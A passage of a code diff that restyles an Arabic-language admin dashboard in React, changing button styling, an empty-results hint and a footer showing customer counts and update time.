+                    <td className="px-4 py-4">
                       <button
                         onClick={() => viewDetails(customer)}
-                        className="bg-blue-600 hover:bg-blue-700 text-white p-2 rounded-lg transition-colors"
-                        title="عرض التفاصيل"
+                        className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white p-2 rounded-lg transition-all shadow-md hover:shadow-lg"
+                        title="عرض جميع التفاصيل"
                       >
                         <Eye className="w-5 h-5" />
                       </button>
@@ -729,14 +945,18 @@ export default function AdminDashboard() {
             <div className="text-center py-12">
               <AlertCircle className="w-16 h-16 text-gray-300 mx-auto mb-4" />
               <p className="text-gray-500 text-lg">لا توجد نتائج</p>
+              <p className="text-gray-400 text-sm mt-2">جرب تغيير معايير البحث أو الفلتر</p>
             </div>
           )}
         </div>
 
         {/* Footer */}
-        <div className="mt-6 text-center text-gray-600 text-sm">
-          <p>آخر تحديث: {new Date().toLocaleString('ar-QA')}</p>
-          <p className="mt-1">عدد العملاء المعروضين: {filteredCustomers.length} من أصل {customers.length}</p>
+        <div className="mt-6 text-center text-gray-600 text-sm bg-white rounded-lg p-4 shadow">
+          <p className="font-semibold">آخر تحديث: {new Date().toLocaleString('ar-QA')}</p>
+          <p className="mt-1">عدد العملاء المعروضين: <span className="font-bold text-blue-600">{filteredCustomers.length}</span> من أصل <span className="font-bold">{customers.length}</span></p>
+          <p className="mt-2 text-xs text-gray-500">
+            التحديث التلقائي نشط • جميع البيانات محدثة مباشرة
+          </p>
         </div>
       </div>
     </div>
